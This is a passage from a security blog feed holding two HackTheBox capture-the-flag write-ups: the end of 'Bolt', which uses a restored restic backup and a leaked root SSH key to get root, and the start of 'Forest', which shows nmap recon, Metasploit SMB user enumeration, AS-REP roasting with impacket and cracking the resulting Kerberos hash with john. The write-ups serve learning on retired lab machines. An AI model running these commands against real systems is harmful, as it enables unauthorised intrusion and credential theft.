&lt;span class="code-line"&gt;bf190199  2019-12-05 15:21:59  bolt                    /home/bolt&lt;/span&gt;
&lt;span class="code-line"&gt;c7702698  2019-12-05 15:23:55  bolt                    /home/bolt&lt;/span&gt;
&lt;span class="code-line"&gt;485d9809  2019-12-05 15:25:06  bolt                    /root&lt;/span&gt;
&lt;span class="code-line"&gt;----------------------------------------------------------------------&lt;/span&gt;
&lt;span class="code-line"&gt;4 snapshots&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We restore the last snapshot in a new directory. It generate some errors that we
don't really care about.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ mkdir rest&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ restic -r ./srv/ restore 485d9809 --target  ./rest&lt;/span&gt;
&lt;span class="code-line"&gt;enter password for repository:&lt;/span&gt;
&lt;span class="code-line"&gt;password is correct&lt;/span&gt;
&lt;span class="code-line"&gt;restoring &amp;lt;Snapshot 485d9809 of [/root] at 2019-12-05 15:25:06.665521427 +0000 UTC by root@bolt&amp;gt; to ./rest&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.bash_history: Lchown: lchown /tmp/ioio2/rest/root/.bash_history: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.bashrc: Lchown: lchown /tmp/ioio2/rest/root/.bashrc: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.cache/motd.legal-displayed: Lchown: lchown /tmp/ioio2/rest/root/.cache/motd.legal-displayed: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.cache: Lchown: lchown /tmp/ioio2/rest/root/.cache: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.config/composer/keys.dev.pub: Lchown: lchown /tmp/ioio2/rest/root/.config/composer/keys.dev.pub: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.config/composer/keys.tags.pub: Lchown: lchown /tmp/ioio2/rest/root/.config/composer/keys.tags.pub: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.config/composer: Lchown: lchown /tmp/ioio2/rest/root/.config/composer: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.config: Lchown: lchown /tmp/ioio2/rest/root/.config: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.gnupg/private-keys-v1.d: Lchown: lchown /tmp/ioio2/rest/root/.gnupg/private-keys-v1.d: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.gnupg: Lchown: lchown /tmp/ioio2/rest/root/.gnupg: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.local/share/nano: Lchown: lchown /tmp/ioio2/rest/root/.local/share/nano: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.local/share: Lchown: lchown /tmp/ioio2/rest/root/.local/share: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.local: Lchown: lchown /tmp/ioio2/rest/root/.local: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.profile: Lchown: lchown /tmp/ioio2/rest/root/.profile: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.selected_editor: Lchown: lchown /tmp/ioio2/rest/root/.selected_editor: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.ssh/authorized_keys: Lchown: lchown /tmp/ioio2/rest/root/.ssh/authorized_keys: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.ssh/id_rsa: Lchown: lchown /tmp/ioio2/rest/root/.ssh/id_rsa: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.ssh/id_rsa.pub: Lchown: lchown /tmp/ioio2/rest/root/.ssh/id_rsa.pub: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.ssh: Lchown: lchown /tmp/ioio2/rest/root/.ssh: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/.wget-hsts: Lchown: lchown /tmp/ioio2/rest/root/.wget-hsts: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/config.yml: Lchown: lchown /tmp/ioio2/rest/root/config.yml: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/cron.sh: Lchown: lchown /tmp/ioio2/rest/root/cron.sh: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root/root.txt: Lchown: lchown /tmp/ioio2/rest/root/root.txt: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;ignoring error for /root: Lchown: lchown /tmp/ioio2/rest/root: operation not permitted&lt;/span&gt;
&lt;span class="code-line"&gt;There were 24 errors&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In the root directory backup we found the flag as planned.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ls rest&lt;/span&gt;
&lt;span class="code-line"&gt;root&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;rest/root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ cat rest/root/root.txt&lt;/span&gt;
&lt;span class="code-line"&gt;ntrkzgnkotaxyju0ntrinda4yzbkztgw&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;But we also found a SSH private key without password that allow us to connect as
root on the box!&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.&lt;/span&gt;
&lt;span class="code-line"&gt;./                ../               .bash_history     .bashrc           .cache/           .config/          .gnupg/           .local/           .profile          .selected_editor  .ssh/             .wget-hsts&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;authorized_keys  id_rsa           id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;bolt@bolt:/tmp/ioio2$ ls rest/root/.ssh/&lt;/span&gt;
&lt;span class="code-line"&gt;authorized_keys  id_rsa  id_rsa.pub&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Once copied on our local machine.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;ssh root@10.10.10.159 -i ./id_rsa_root&lt;/span&gt;
&lt;span class="code-line"&gt;Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System information as of Thu Dec  5 18:51:02 UTC 2019&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  System load:  0.08              Users logged in:                1&lt;/span&gt;
&lt;span class="code-line"&gt;  Usage of /:   5.6% of 61.80GB   IP address for eth0:            10.10.10.159&lt;/span&gt;
&lt;span class="code-line"&gt;  Memory usage: 42%               IP address for br-1bad9bd75d17: 172.18.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;  Swap usage:   0%                IP address for docker0:         172.17.0.1&lt;/span&gt;
&lt;span class="code-line"&gt;  Processes:    170&lt;/span&gt;
&lt;span class="code-line"&gt;Last login: Mon Oct 21 09:53:48 2019&lt;/span&gt;
&lt;span class="code-line"&gt;root@bolt:~#&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
&lt;p&gt;What a journey! This box was very interesting I learn a lot about Docker
registry in the user part. The root part was quit harder but also interesting.
The backup database was quit a rabbit hole for me. But once connected as admin
on the bolt CMS things get chained up pretty quick.
Many thanks to &lt;a href="https://www.hackthebox.eu/home/users/profile/4615"&gt;thek&lt;/a&gt; for
this awesome box!&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="linux"></category><category term="HTB"></category><category term="docker"></category><category term="bolt CMS"></category><category term="restic"></category><category term="SUID"></category></entry><entry><title>HTB: Forest</title><link href="https://maggick.fr/2020/03/htb-forest.html" rel="alternate"></link><published>2020-03-21T17:10:00+01:00</published><updated>2020-03-21T17:10:00+01:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-03-21:/2020/03/htb-forest.html</id><summary type="html">&lt;p&gt;&lt;img alt="Forest card" class="align-left" src="/media/2020.03/forest_card.png" width="262"/&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/212"&gt;Forest&lt;/a&gt; published by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on October the 12th
2019.
This box is a Windows machine classified as easy.
The server is a Domain Controller with 24 open ports.
We will use Winrm, bloodhound and impacket to get both the user flag and the
"root" flag.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left" src="/media/2020.03/forest_card.png" alt="Forest card" width="262"&gt;&lt;/p&gt;
&lt;p&gt;This is a writeup about a retired HacktheBox machine:
&lt;a href="https://www.hackthebox.eu/home/machines/profile/212"&gt;Forest&lt;/a&gt; published by
&lt;a href="https://www.hackthebox.eu/home/users/profile/1190"&gt;egre55&lt;/a&gt; and
&lt;a href="https://www.hackthebox.eu/home/users/profile/2984"&gt;mrb3n&lt;/a&gt; on October the 12th
2019.
This box is a Windows machine classified as easy.
The server is a Domain Controller with 24 open ports.
We will use Winrm, bloodhound and impacket to get both the user flag and the
"root" flag.&lt;/p&gt;


&lt;h1 id="recon"&gt;Recon&lt;/h1&gt;
&lt;p&gt;We start with an nmap scan. 24 ports are open. Using the service detection with
gather several informations about the box:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;The server is a MS Windows Server 2008 R2&lt;/li&gt;
&lt;li&gt;The server is in the htb.local domain&lt;/li&gt;
&lt;li&gt;The server is in the HTB workgroup&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Here is the nmap scan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;# Nmap 7.80 scan initiated Thu Oct 24 09:17:28 2019 as: nmap -p- -sSV -oA nmap_ssv 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;Nmap scan report for 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;Host is up (0.094s latency).&lt;/span&gt;
&lt;span class="code-line"&gt;Not shown: 65511 closed ports&lt;/span&gt;
&lt;span class="code-line"&gt;PORT      STATE SERVICE      VERSION&lt;/span&gt;
&lt;span class="code-line"&gt;53/tcp    open  domain?&lt;/span&gt;
&lt;span class="code-line"&gt;88/tcp    open  kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-24 07:29:09Z)&lt;/span&gt;
&lt;span class="code-line"&gt;135/tcp   open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn&lt;/span&gt;
&lt;span class="code-line"&gt;389/tcp   open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds (workgroup: HTB)&lt;/span&gt;
&lt;span class="code-line"&gt;464/tcp   open  kpasswd5?&lt;/span&gt;
&lt;span class="code-line"&gt;593/tcp   open  ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;636/tcp   open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;3268/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)&lt;/span&gt;
&lt;span class="code-line"&gt;3269/tcp  open  tcpwrapped&lt;/span&gt;
&lt;span class="code-line"&gt;5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;9389/tcp  open  mc-nmf       .NET Message Framing&lt;/span&gt;
&lt;span class="code-line"&gt;47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)&lt;/span&gt;
&lt;span class="code-line"&gt;49664/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49665/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49666/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49667/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49669/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49676/tcp open  ncacn_http   Microsoft Windows RPC over HTTP 1.0&lt;/span&gt;
&lt;span class="code-line"&gt;49677/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49684/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49706/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;49915/tcp open  msrpc        Microsoft Windows RPC&lt;/span&gt;
&lt;span class="code-line"&gt;1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :&lt;/span&gt;
&lt;span class="code-line"&gt;SF-Port53-TCP:V=7.80%I=7%D=10/24%Time=5DB150FF%P=x86_64-pc-linux-gnu%r(DNS&lt;/span&gt;
&lt;span class="code-line"&gt;SF:VersionBindReqTCP,20,&amp;quot;\0\x1e\0\x06\x81\x04\0\x01\0\0\0\0\0\0\x07version&lt;/span&gt;
&lt;span class="code-line"&gt;SF:\x04bind\0\0\x10\0\x03&amp;quot;);&lt;/span&gt;
&lt;span class="code-line"&gt;Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Read data files from: /usr/bin/../share/nmap&lt;/span&gt;
&lt;span class="code-line"&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .&lt;/span&gt;
&lt;span class="code-line"&gt;# Nmap done at Thu Oct 24 09:23:52 2019 -- 1 IP address (1 host up) scanned in 384.59 seconds&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We use &lt;code&gt;getArch.py&lt;/code&gt; from &lt;a href="https://github.com/SecureAuthCorp/impacket"&gt;impacket&lt;/a&gt;
to determine the machine Architecture, the machine is 64-bits.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python getArch.py -target 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Gathering OS architecture for 1 machines&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Socket connect timeout set to 2 secs&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.161 is 64-bi&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We check the open ports using &lt;a href="https://sushant747.gitbooks.io/total-oscp-guide/list_of_common_ports.html"&gt;a useful website&lt;/a&gt;&lt;/p&gt;
&lt;h2 id="port-88-kerberos"&gt;Port 88: Kerberos&lt;/h2&gt;
&lt;p&gt;We need an account to exploit this port.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Kerberos is a protocol that is used for network authentication. Different versions are used by Unix and Windows. But if you see a machine with port 88 open you can be fairly certain that it is a Windows Domain Controller.&lt;/p&gt;
&lt;p&gt;If you already have a login to a user of that domain you might be able to escalate that privilege.&lt;/p&gt;
&lt;p&gt;Check out: MS14-068&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="port-m135-msrpc"&gt;Port M135: MSRPC&lt;/h2&gt;
&lt;p&gt;We enumerate using &lt;code&gt;nmap&lt;/code&gt; and metasploit without success.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This is the windows rpc-port. &lt;a href="https://en.wikipedia.org/wiki/Microsoft_RPC"&gt;https://en.wikipedia.org/wiki/Microsoft_RPC&lt;/a&gt;
Enumerate
nmap 192.168.0.101 --script=msrpc-enum&lt;/p&gt;
&lt;p&gt;msf &amp;gt; use exploit/windows/dcerpc/ms03_026_dcom&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="port-139-smb"&gt;Port 139: SMB&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Samba is a service that enables the user to share files with other machines. It has interoperatibility, which means that it can share stuff between linux and windows systems. A windows user will just see an icon for a folder that contains some files. Even though the folder and files really exists on a linux-server.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="ports-389-and-636-ldap"&gt;Ports 389 and 636: LDAP&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Lightweight Directory Access Protocol. This port is usually used for Directories. Directory her means more like a telephone-directory rather than a folder. Ldap directory can be understood a bit like the windows registry. A database-tree. Ldap is sometimes used to store usersinformation. Ldap is used more often in corporate structure. Webapplications can use ldap for authentication. If that is the case it is possible to perform ldap-injections which are similar to sqlinjections.&lt;/p&gt;
&lt;p&gt;You can sometimes access the ldap using a anonymous login, or with other words no session. This can be useful becasue you might find some valuable data, about users.&lt;/p&gt;
&lt;p&gt;ldapsearch -h 192.168.1.101 -p 389 -x -b "dc=mywebsite,dc=com"&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="ports-445-464-593-3269-49664-49665-49666-49667-49669-49676-49677-49684-49706-49915"&gt;Ports 445, 464, 593, 3269, 49664, 49665, 49666, 49667, 49669, 49676, 49677, 49684, 49706, 49915&lt;/h2&gt;
&lt;p&gt;Not included in the gitbook&lt;/p&gt;
&lt;h2 id="port-5985-winrm"&gt;Port 5985: WinRM&lt;/h2&gt;
&lt;p&gt;Not included in the gitbook but a "well known" protocol.&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;WinRM, or Windows Remote Management, is an HTTP based remote management and shell protocol for Windows. The Windows Remote Management Service is responsible for this functionality. If WinRM is not configured for remote access, but the service is started, it listens for local requests on TCP port 47001. If you create listener it will still listen on 47001, but also on the default TCP ports 5985 (HTTP) and 5986 (HTTPS).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="port-3268-globalcatldap"&gt;Port 3268: globalcatLdap&lt;/h2&gt;
&lt;p&gt;No description&lt;/p&gt;
&lt;h2 id="port-9389"&gt;Port 9389&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;Active Directory Administrative Center is installed by default on Windows Server 2008 R2 and is available on Windows 7 when you install the Remote Server Administration Tools (RSAT).&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id="port-47001-windows-remote-management-service"&gt;Port 47001: Windows Remote Management Service&lt;/h2&gt;
&lt;p&gt;No more information.&lt;/p&gt;
&lt;h1 id="getting-user"&gt;Getting user&lt;/h1&gt;
&lt;h2 id="enumerating-user-with-smb"&gt;enumerating user with SMB&lt;/h2&gt;
&lt;p&gt;The SMB port is open, we can enumerate local users. Moreover, as the server is a Domain
Controller, every "local" user is a domain user.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;msf5 &amp;gt; use auxiliary/scanner/smb/smb_enumusers&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; set rhosts 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;rhosts =&amp;gt; 10.10.10.161&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; show options&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;Module options (auxiliary/scanner/smb/smb_enumusers):&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;  Name       Current Setting  Required  Description&lt;/span&gt;
&lt;span class="code-line"&gt;  ----       ---------------  --------  -----------&lt;/span&gt;
&lt;span class="code-line"&gt;  RHOSTS     10.10.10.161     yes       The target host(s), range CIDR identifier, or hosts file with syntax &amp;#39;file:&amp;lt;path&amp;gt;&amp;#39;&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBDomain  .                no        The Windows domain to use for authentication&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBPass                     no        The password for the specified username&lt;/span&gt;
&lt;span class="code-line"&gt;  SMBUser                     no        The username to authenticate as&lt;/span&gt;
&lt;span class="code-line"&gt;  THREADS    1                yes       The number of concurrent threads&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;msf5 auxiliary(scanner/smb/smb_enumusers) &amp;gt; run&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[+] 10.10.10.161:445      - HTB [ Administrator, Guest, krbtgt, DefaultAccount, $331000-VK4ADACQNUCA, SM_2c8eef0a09b545acb, SM_ca8c2ed5bdab4dc9b, SM_75a538d3025e4db9a, SM_681f53d4942840e18, SM_1b41c9286325456bb, SM_9b69f1b9d2cc45549, SM_7c96b981967141ebb, SM_c75ee099d0a64c91b, SM_1ffab36a2f5f479cb, HealthMailboxc3d7722, HealthMailboxfc9daad, HealthMailboxc0a90c9, HealthMailbox670628e, HealthMailbox968e74d, HealthMailbox6ded678, HealthMailbox83d6781, HealthMailboxfd87238, HealthMailboxb01ac64, HealthMailbox7108a4e, HealthMailbox0659cc1, sebastien, lucinda, svc-alfresco, andy, mark, santi ] ( LockoutTries=0 PasswordMin=7 )&lt;/span&gt;
&lt;span class="code-line"&gt;[*] 10.10.10.161:         - Scanned 1 of 1 hosts (100% complete)&lt;/span&gt;
&lt;span class="code-line"&gt;[*] Auxiliary module execution completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id="getting-npusers"&gt;Getting NPUsers&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;UF_DONT_REQUIRE_PREAUTH&lt;/code&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;This bit indicates that there is no so-called pre-authentication necessary for Kerberos authentication of the account. This is only for older Kerberos client important, which need to login to the domain from foreign systems and which does not support Kerberos pre-authentication. For accounts that log on from a Windows machine, or just for machine accounts of Windows domain members, this flag flag should NEVER be set, for the pre-authentication prevents certain types of dictionary attacks on the Kerberos login.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;We create a file with the users.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat users.txt&lt;/span&gt;
&lt;span class="code-line"&gt;sebastien&lt;/span&gt;
&lt;span class="code-line"&gt;lucinda&lt;/span&gt;
&lt;span class="code-line"&gt;svc-alfresco&lt;/span&gt;
&lt;span class="code-line"&gt;andy&lt;/span&gt;
&lt;span class="code-line"&gt;mark&lt;/span&gt;
&lt;span class="code-line"&gt;santi&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;In order to use &lt;a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"&gt;impacket's&lt;/a&gt; &lt;code&gt;GetNPUsers.py&lt;/code&gt;
we need to add an entry in our &lt;code&gt;/etc/hosts&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;cat /etc/hosts&lt;/span&gt;
&lt;span class="code-line"&gt;127.0.0.1   localhost&lt;/span&gt;
&lt;span class="code-line"&gt;127.0.1.1   kalili&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.161    htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;10.10.10.161    forest.htb.local&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;And we launch &lt;a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetNPUsers.py"&gt;impacket's&lt;/a&gt; &lt;code&gt;GetNPUsers.py&lt;/code&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;python GetNPUsers.py htb.local/ -no-pass -usersfile users.txt -format john&lt;/span&gt;
&lt;span class="code-line"&gt;Impacket v0.9.16-dev - Copyright 2002-2018 Core Security Technologies&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User sebastien doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User lucinda doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
&lt;span class="code-line"&gt;$krb5asrep$svc-alfresco@HTB.LOCAL:bcd2217d8b5e6884e25d8b2860dd0380$40be3fda5f8fd984f9c576d5dfa33f37effc76b0fbff3ae28a747825c3559bfea4a6a23ad1c0add8ad61d149a5ccc2e79919de9b78e8720b3dc79af96364fb6f5d7e0235eb83850765023a30de6d172c82ec751f50f4c6e4971cb54a46e16ec2d3a41b9f44b6b8e85782d958c3ff665baa5b29d8c5b4516ec1b63f7c63b55c5fa74b7b1b5fe1fa04cddac6812d0ef37f1e25ab8e8005fe7f6ce949786435c41a2395e73e9bf1de57e3a2da12a00f9da25408e92a37a5ed2dacdbbf3846963000f7b2f8d337d152345a9cc7358b5d45224abeac179f081b9b329e549659da00ac791a7fde1a8c&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User andy doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User mark doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
&lt;span class="code-line"&gt;[-] User santi doesn&amp;#39;t have UF_DONT_REQUIRE_PREAUTH set&lt;/span&gt;
&lt;span class="code-line"&gt;[-] invalid principal syntax&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;We crack the password using john and the rockyou dictionary. The user's
password is "s3rvice".&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;john hashes -w=~/tools/password_lists/rockyou.txt&lt;/span&gt;
&lt;span class="code-line"&gt;Warning: detected hash type &amp;quot;krb5asrep&amp;quot;, but the string is also recognized as &amp;quot;krb5asrep-aes-opencl&amp;quot;&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--format=krb5asrep-aes-opencl&amp;quot; option to force loading these as that type instead&lt;/span&gt;
&lt;span class="code-line"&gt;Using default input encoding: UTF-8&lt;/span&gt;
&lt;span class="code-line"&gt;Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 AVX 4x])&lt;/span&gt;
&lt;span class="code-line"&gt;Will run 4 OpenMP threads&lt;/span&gt;
&lt;span class="code-line"&gt;Press &amp;#39;q&amp;#39; or Ctrl-C to abort, almost any other key for status&lt;/span&gt;
&lt;span class="code-line"&gt;0g 0:00:00:02 11.59% (ETA: 11:52:21) 0g/s 913958p/s 913958c/s 913958C/s eddie707..eck1956&lt;/span&gt;
&lt;span class="code-line"&gt;s3rvice          ($krb5asrep$svc-alfresco@HTB.LOCAL)&lt;/span&gt;
&lt;span class="code-line"&gt;1g 0:00:00:04 DONE (2019-10-24 11:52) 0.2237g/s 914040p/s 914040c/s 914040C/s s401413..s3r1bu&lt;/span&gt;
&lt;span class="code-line"&gt;Use the &amp;quot;--show&amp;quot; option to display all of the cracked passwords reliably&lt;/span&gt;
&lt;span class="code-line"&gt;Session completed&lt;/span&gt;
&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

